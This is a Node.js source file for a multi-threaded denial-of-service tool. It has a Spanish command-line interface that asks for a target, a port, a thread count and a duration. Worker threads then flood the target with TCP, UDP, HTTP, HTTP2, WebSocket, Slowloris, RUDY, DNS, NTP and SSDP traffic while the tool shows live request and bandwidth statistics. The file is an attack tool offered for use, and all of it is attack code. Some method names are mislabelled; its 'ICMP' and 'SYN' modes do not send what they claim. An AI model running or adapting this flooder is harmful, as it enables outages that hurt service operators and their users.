#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0, start: 0 };
        this.config = { workers: [], anim: ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏'] };
        this.running = false;
        this.allMethods = [
            'TCP', 'UDP', 'HTTP', 'HTTPS', 'HTTP2', 'WEBSOCKET',
            'SLOWLORIS', 'DNS', 'NTP', 'SSDP', 'ICMP', 'SYN', 'RUDY'
        ];
    }

    async init() {
        const targetInput = await this.ask(chalk.greenBright('IP/URL objetivo: '));
        const parsedTarget = await this.parseTarget(targetInput);
        
        this.target = parsedTarget.hostname;
        this.port = parsedTarget.port;
        this.resolvedIP = await this.resolveTarget(this.target);

        if (net.isIP(this.target) && !parsedTarget.hasPort) {
            const portInput = await this.ask(chalk.greenBright('Puerto: ')) || '80';
            this.port = parseInt(portInput, 10);
        }

        this.threads = Math.min(
            parseInt(await this.ask(chalk.greenBright('Hilos (500-5000): ')) || 1000, 10) || 1000, 
            5000
        );

        this.duration = Math.min(
            parseInt(await this.ask(chalk.greenBright('Duración (segundos): ')) || 60, 10) || 60, 
            3600
        );

        this.methods = await this.selectMethods();

        this.generatePayloads();
        this.showAttackSummary();
        this.start();
    }

    async parseTarget(input) {
        try {
            const originalInput = input;
            if (!input.startsWith('http')) input = `http://${input}`;
            const parsed = new url.URL(input);
            const hasPort = originalInput.includes(':') && !!parsed.port;

            return {
                hostname: parsed.hostname,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                hasPort: hasPort
            };
        } catch (e) {
            console.log(chalk.red('Formato inválido'));
            process.exit(1);
        }
    }

    async resolveTarget(host) {
        if (net.isIP(host)) return host;
        try {
            const { address } = await dns.lookup(host);
            console.log(chalk.yellow(`Resolución DNS: ${host} => ${address}`));
            return address;
        } catch {
            console.log(chalk.red('Error DNS'));
            process.exit(1);
        }
    }

    async selectMethods() {
        const metodos = await this.ask(
            chalk.greenBright('Métodos disponibles:\n') +
            chalk.yellow(this.allMethods.join(', ') + '\n') +
            chalk.greenBright('Métodos (separar por coma) [Enter para todos]: ')
        );
        return metodos.toUpperCase().split(',').map(m => m.trim()).filter(Boolean);
    }

    generatePayloads() {
        const createPayload = size => {
            const buf = Buffer.alloc(size);
            randomFillSync(buf);
            return buf;
        };

        this.payloads = {
            tcp: createPayload(1024),
            udp: createPayload(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${this.target}\r\n\r\n`,
            dns: this.createDnsPacket(),
            ntp: Buffer.from([0x1B, ...Buffer.alloc(47)]),
            ssdp: Buffer.from('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'),
            icmp: this.createIcmpPacket(),
            syn: Buffer.alloc(64),
            rudy: Buffer.from('POST / HTTP/1.1\r\nContent-Length: 1000000\r\n\r\n')
        };
    }

    createDnsPacket() {
        const domain = randomBytes(8).toString('hex') + '.com';
        return Buffer.from([0xAA, 0xAA, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, domain.length, ...Buffer.from(domain), 0x00, 0x00, 0x01, 0x00, 0x01]);
    }

    createIcmpPacket() {
        const buf = Buffer.alloc(64);
        buf.writeUInt8(8, 0);
        return buf;
    }

    showAttackSummary() {
        console.log(chalk.cyanBright('\nConfiguración:'));
        console.log(chalk.yellow(`Objetivo: ${this.target}:${this.port}`));
        console.log(chalk.yellow(`Duración: ${this.duration}s`));
        console.log(chalk.yellow(`Hilos: ${this.threads}`));
        console.log(chalk.yellow(`Métodos: ${this.methods.length ? this.methods.join(', ') : 'TODOS'}\n`));
    }

    start() {
        this.running = true;
        this.stats.start = performance.now();
        console.log(chalk.green('Iniciando ataque...'));
        this.launchWorkers();
        this.showStats();
        setTimeout(() => this.stop(), this.duration * 1000);
    }

    launchWorkers() {
        const cores = Math.min(require('os').cpus().length, 16);
        const threadsPerWorker = Math.ceil(this.threads / cores) * 5;

        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: { 
                    target: this.resolvedIP,
                    port: this.port,
                    payloads: this.payloads,
                    methods: this.methods.length > 0 ? this.methods : this.allMethods,
                    threads: threadsPerWorker,
                    hostHeader: this.target
                }
            });

            worker.on('message', msg => this.updateStats(msg));
            worker.on('error', err => console.error(chalk.red(`Worker Error: ${err.message}`)));
            this.config.workers.push(worker);
        }
    }

    updateStats({ total, success, failed, bw }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.failed += failed;
        this.stats.bandwidth += bw;
    }

    showStats() {
        if (!this.running) return;
        const elapsed = (performance.now() - this.stats.start) / 1000;
        const frame = this.config.anim[Math.floor(elapsed * 10) % 10];
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);

        process.stdout.write(chalk`\r{green ${frame}} T: {greenBright ${elapsed.toFixed(1)}s} Req: {cyan ${this.stats.total}} SPS: {cyan ${rps}} BW: {cyan ${bw}GB} ({green ${this.stats.success}}|{red ${this.stats.failed}})`);

        setTimeout(() => this.showStats(), 100);
    }

    stop() {
        this.running = false;
        this.config.workers.forEach(w => w.terminate());
        console.log(chalk.yellow('\nAtaque detenido\n'));
        process.exit();
    }

    ask(prompt) {
        return new Promise(resolve => {
            const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
            rl.question(prompt, answer => { rl.close(); resolve(answer); });
        });
    }
}

if (isMainThread) {
    new DDoSAttack().init();
} else {
    const { target, port, payloads, methods, threads, hostHeader } = workerData;

    const attackMethods = {
        TCP: () => {
            const socket = new net.Socket();
            socket.connect(port, target, () => {
                socket.write(payloads.tcp);
                report('success', payloads.tcp.length);
                socket.destroy();
            }).on('error', () => report('failed', 0));
        },

        UDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.udp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.udp.length);
                socket.close();
            });
        },

        HTTP: () => {
            const req = http.get(`http://${target}:${port}`, {
                headers: { Host: hostHeader }
            }, () => {
                report('success', 0);
                req.destroy();
            }).on('error', () => report('failed', 0));
        },

        HTTPS: () => {
            const req = https.get(`https://${target}:${port}`, {
                rejectUnauthorized: false,
                headers: { Host: hostHeader }
            }, () => {
                report('success', 0);
                req.destroy();
            }).on('error', () => report('failed', 0));
        },

        HTTP2: () => {
            const client = http2.connect(`https://${target}:${port}`, { 
                rejectUnauthorized: false 
            });
            client.on('error', () => report('failed', 0));
            
            const req = client.request({ 
                ':path': '/',
                ':authority': hostHeader
            });
            req.on('data', () => {});
            req.on('end', () => {
                report('success', 0);
                client.close();
            });
            req.end();
        },

        WEBSOCKET: () => {
            const ws = new WebSocket(`ws://${target}:${port}`, {
                headers: { 'Host': hostHeader }
            });
            ws.on('open', () => {
                ws.send(payloads.tcp);
                report('success', payloads.tcp.length);
                ws.close();
            }).on('error', () => report('failed', 0));
        },

        SLOWLORIS: () => {
            const socket = net.connect(port, target);
            socket.write(`GET / HTTP/1.1\r\nHost: ${hostHeader}\r\n`);
            const timer = setInterval(() => {
                socket.write(`X-${randomBytes(2).toString('hex')}: ${Math.random()}\r\n`);
            }, 15000);
            socket.on('error', () => clearInterval(timer));
        },

        DNS: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.dns, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.dns.length);
                socket.close();
            });
        },

        NTP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.ntp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.ntp.length);
                socket.close();
            });
        },

        SSDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.ssdp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.ssdp.length);
                socket.close();
            });
        },

        ICMP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.icmp, 0, payloads.icmp.length, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.icmp.length);
                socket.close();
            });
        },

        SYN: () => {
            const socket = net.createConnection({ port, host: target }, () => {
                report('success', payloads.syn.length);
                socket.destroy();
            }).on('error', () => report('failed', 0));
        },

        RUDY: () => {
            const socket = net.connect(port, target, () => {
                socket.write(payloads.rudy);
                const slowData = () => {
                    if (socket.writable) {
                        socket.write(`${randomBytes(2).toString('hex')}=`);
                        setTimeout(slowData, 500);
                    }
                };
                slowData();
            }).on('error', () => report('failed', 0));
        }
    };

    function report(type, bw) {
        parentPort.postMessage({
            total: 1,
            success: type === 'success' ? 1 : 0,
            failed: type === 'failed' ? 1 : 0,
            bw: bw
        });
    }

    setInterval(() => {
        const methodsToUse = methods;
        const start = performance.now();
        
        while (performance.now() - start < 100) {
            for (let i = 0; i < threads * 50; i++) {
                methodsToUse.forEach(method => {
                    try {
                        attackMethods[method]();
                        attackMethods[method]();
                    } catch {
                        report('failed', 0);
                    }
                });
            }
        }
    }, 100);
}